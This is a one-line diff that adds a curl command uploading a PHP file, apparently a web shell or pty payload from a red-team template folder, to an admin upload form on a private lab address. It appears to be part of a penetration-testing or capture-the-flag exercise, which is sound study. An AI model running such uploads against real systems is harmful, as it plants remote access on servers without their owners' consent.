@@ -1,0 +1,1 @@
+curl -H "Content-type: multipart/form-data" -F file=@~/Red-Team/Template/ptty/python3.php -F hash=e554e86a29ef7d32cfe35c3521dd5029b405992d -F submit=upload -X POST http://10.129.42.249/admin/upload.php
